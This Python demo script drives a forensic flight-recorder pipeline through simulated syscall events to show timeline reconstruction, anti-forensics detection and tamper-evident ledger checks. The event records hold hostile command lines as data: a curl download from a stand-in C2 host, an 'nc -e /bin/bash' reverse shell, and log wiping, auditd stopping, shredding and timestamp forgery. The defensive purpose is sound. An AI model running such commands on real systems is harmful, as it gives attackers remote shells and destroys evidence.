"""
CHRONOS-FL — End-to-End Cyber Forensic Flight Recorder Demonstration.
"""

from __future__ import annotations
import time

from chronos.system.collector import EvidenceCollector
from chronos.system.snapshot_recorder import SnapshotRecorder
from chronos.system.ledger_storage import EvidenceLedgerStorage
from chronos.research.timeline_engine import TimelineEngine
from chronos.research.causality_engine import CausalityEngine
from chronos.research.detection_engine import AntiForensicsDetectionEngine
from chronos.research.trust_engine import TrustAnalysisEngine
from chronos.shared.models import EventType, Event


def run_chronos_demo() -> None:
    print("=" * 85)
    print("      🛰️ CHRONOS-FL — CYBER FORENSIC FLIGHT RECORDER PIPELINE DEMO")
    print("=" * 85)

    collector = EvidenceCollector(host_id="flight_recorder_01")
    timeline_engine = TimelineEngine()
    causality_engine = CausalityEngine(host_id="flight_recorder_01")
    detection_engine = AntiForensicsDetectionEngine()
    snapshot_recorder = SnapshotRecorder()
    ledger_storage = EvidenceLedgerStorage(chunk_size=3)
    trust_engine = TrustAnalysisEngine()

    detection_engine.register_alert_callback(snapshot_recorder.on_anti_forensic_alert)

    def pipeline_bus(event: Event):
        timeline_engine.add_event(event)
        causality_engine.ingest_event(event)
        detection_engine.analyze_event(event)
        ledger_storage.add_event(event)

    collector.register_listener(pipeline_bus)

    print("\n[1/7] Ingesting Syscall Telemetry Streams (Process, File, Network, Privilege)...")
    now = time.time() - 300

    collector.record_event(EventType.EXECVE.value, pid=1001, ppid=1, user="root", comm="sshd", cmdline="sshd: root@pts/0", timestamp=now)
    collector.record_event(EventType.EXECVE.value, pid=1002, ppid=1001, user="root", comm="bash", cmdline="/bin/bash", timestamp=now + 60)
    collector.record_event(EventType.EXECVE.value, pid=1003, ppid=1002, user="root", comm="curl", cmdline="curl -s http://malicious.c2/agent.bin -o /tmp/agent.bin", target_path="/tmp/agent.bin", timestamp=now + 120)
    collector.record_event(EventType.FILE_CREATE.value, pid=1003, ppid=1002, user="root", comm="curl", target_path="/tmp/agent.bin", timestamp=now + 121)
    collector.record_event(EventType.EXECVE.value, pid=1004, ppid=1002, user="root", comm="agent.bin", cmdline="./agent.bin --daemon", target_path="/tmp/agent.bin", timestamp=now + 180)
    collector.record_event(EventType.CONNECT.value, pid=1005, ppid=1004, user="root", comm="nc", cmdline="nc -e /bin/bash 198.51.100.45 4444", target_ip="198.51.100.45", target_port=4444, timestamp=now + 240)

    print(f"      ✔ Ingested {len(collector.events)} forensic events across process, file, and network vectors.")

    print("\n[2/7] Reconstructing Primary Forensic Timeline...")
    print(timeline_engine.generate_summary())

    print("\n[3/7] Constructing Evidence Causality Graph...")
    print(causality_engine.render_ascii_graph())

    print("\n[4/7] Simulating Anti-Forensic Attack & Detecting Evidence Destruction...")
    collector.record_event(EventType.EXECVE.value, pid=1006, ppid=1002, user="root", comm="rm", cmdline="rm -rf /var/log/*", target_path="/var/log/syslog", timestamp=now + 270)
    collector.record_event(EventType.EXECVE.value, pid=1007, ppid=1002, user="root", comm="bash", cmdline="history -c", timestamp=now + 275)
    collector.record_event(EventType.EXECVE.value, pid=1008, ppid=1002, user="root", comm="systemctl", cmdline="systemctl stop auditd", timestamp=now + 280)
    collector.record_event(EventType.EXECVE.value, pid=1009, ppid=1002, user="root", comm="shred", cmdline="shred -u /tmp/agent.bin", target_path="/tmp/agent.bin", timestamp=now + 285)
    collector.record_event(EventType.EXECVE.value, pid=1010, ppid=1002, user="root", comm="touch", cmdline="touch -t 202001010000 /tmp/agent.bin", timestamp=now + 290)
    collector.record_event(EventType.EXECVE.value, pid=1011, ppid=1002, user="root", comm="date", cmdline="date --set='2020-01-01 00:00:00'", timestamp=now + 295)

    print(f"      🚨 DETECTED {len(detection_engine.alerts)} ANTI-FORENSIC ATTEMPTS:")
    for alert in detection_engine.alerts:
        print(f"         • [{alert.severity}] {alert.category:<25}: {alert.description}")

    print(f"\n      📸 AUTOMATIC SNAPSHOT RECORDER ACTIVATED: Captured {len(snapshot_recorder.snapshots)} volatile state snapshots.")

    print("\n[5/7] Sealing & Verifying Tamper-Evident Evidence Ledger...")
    ledger_storage.commit_chunk()
    valid, issues = ledger_storage.verify_integrity()
    print(f"      ✔ Ledger Integrity Status: {'INTACT' if valid else 'TAMPERED'} ({len(ledger_storage.chunks)} chunks sealed)")

    print("\n" + "-" * 85)
    print("                      FORENSIC TRUST ANALYSIS ENGINE OUTPUT")
    print("-" * 85)
    ess = trust_engine.compute_ess(detection_engine.alerts)
    tcs = trust_engine.compute_tcs(ess, detection_engine.alerts, ledger_valid=valid)

    print(f"\n  📊 EVIDENCE SURVIVABILITY SCORE (ESS): {ess.ess_score:.1f}%")
    print(f"     Summary: {ess.summary}")
    print("     Source Status Breakdown:")
    for src in ess.sources:
        status_symbol = "✔ [Present]" if src.status == "Present" else "❌ [Lost]   "
        print(f"       • {src.source_name:<30} {status_symbol} — {src.details}")

    print(f"\n  🛡️ TIMELINE CONFIDENCE SCORE (TCS):   {tcs.tcs_score:.1f}% ({tcs.confidence_level})")
    print(f"     Summary: {tcs.summary}")
    print("     Confidence Penalty Factors:")
    for pen in tcs.penalties:
        print(f"       • [-{pen['penalty']}%] {pen['factor']}: {pen['details']}")

    print("\n" + "-" * 85)
    print("                   MALICIOUS LEDGER TAMPERING VERIFICATION DEMO")
    print("-" * 85)
    print("  [*] Simulating malicious post-hoc modification of Chunk 1 in evidence ledger...")
    ledger_storage.tamper_with_chunk(chunk_index=0, modified_event_index=0, key="cmdline", new_value="/bin/innocent_command")

    valid_after, issues_after = ledger_storage.verify_integrity()
    tcs_after = trust_engine.compute_tcs(ess, detection_engine.alerts, ledger_valid=valid_after, ledger_issues=issues_after)

    print(f"  🚨 LEDGER INTEGRITY CHECK: {'PASSED' if valid_after else 'FAILED (TAMPERING DETECTED!)'}")
    for issue in issues_after:
        print(f"     • ❌ {issue}")
    print(f"  📉 UPDATED TCS SCORE AFTER TAMPERING: {tcs_after.tcs_score:.1f}% ({tcs_after.confidence_level})")

    print("\n" + "=" * 85)
    print("           ✔ CHRONOS-FL PIPELINE DEMO COMPLETED SUCCESSFULLY")
    print("=" * 85)


if __name__ == "__main__":
    run_chronos_demo()
